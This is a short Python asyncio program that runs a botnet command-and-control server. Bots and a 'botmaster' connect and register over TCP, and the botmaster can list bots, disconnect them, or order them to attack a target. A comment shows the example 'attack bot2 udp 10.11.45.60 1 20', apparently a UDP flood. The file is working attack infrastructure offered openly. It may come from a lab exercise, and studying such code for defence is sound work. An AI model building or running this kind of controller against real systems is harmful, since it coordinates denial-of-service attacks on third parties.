import asyncio

clients = {}

async def handle_client(reader, writer):
    client_name = None
    client_host, client_port = writer.get_extra_info('peername')
    print(f'bot connected from {client_host}:{client_port}')
    while True:
        data = await reader.read(100)
        if not data:
            print(f'data is None, disconnect the client {client_name}')
            if client_name in clients:
                del clients[client_name]
            break
        # register botmaster
        # list
        # rst bot1
        # attack bot2 udp 10.11.45.60 1 20
        # register bot1
        message = data.decode()
        para = message.split(' ',2)
        cmd = para[0]
        if cmd == 'register':
            who = para[1]
            if client_name is None:
                client_name = who
                clients[client_name] = writer
                print(f"Client registered: {who}")
            else:
                print(f"Client already been registered: {who}")
        else:
            print(f"message received from: {client_name}:{message}")
            if client_name == 'botmaster':
                botmaster_writer = clients[client_name]
                res = None
                if cmd == 'list':
                    res = ''.join([key + '\n' for key in clients.keys()])
                else:
                    bot = para[1]
                    if bot not in clients.keys():
                        res = f'{bot} not found'
                    bot_writer = clients[bot]
                    if cmd == 'rst':
                        bot_writer.close()
                        del clients[bot]
                        res = f'{bot} disconnected'
                    elif cmd == 'attack':
                        bot_cmd = 'attack ' + para[2]
                        bot_writer.write(bot_cmd.encode())
                        await bot_writer.drain()
                        res = f'cmd:{bot_cmd} sent to bot:{bot}'
                botmaster_writer.write(res.encode())
                await botmaster_writer.drain()


async def main():
    server = await asyncio.start_server(
        handle_client, '10.11.45.53', 9999)

    addr = server.sockets[0].getsockname()
    print(f'Serving on {addr}')

    async with server:
        await server.serve_forever()

asyncio.run(main())

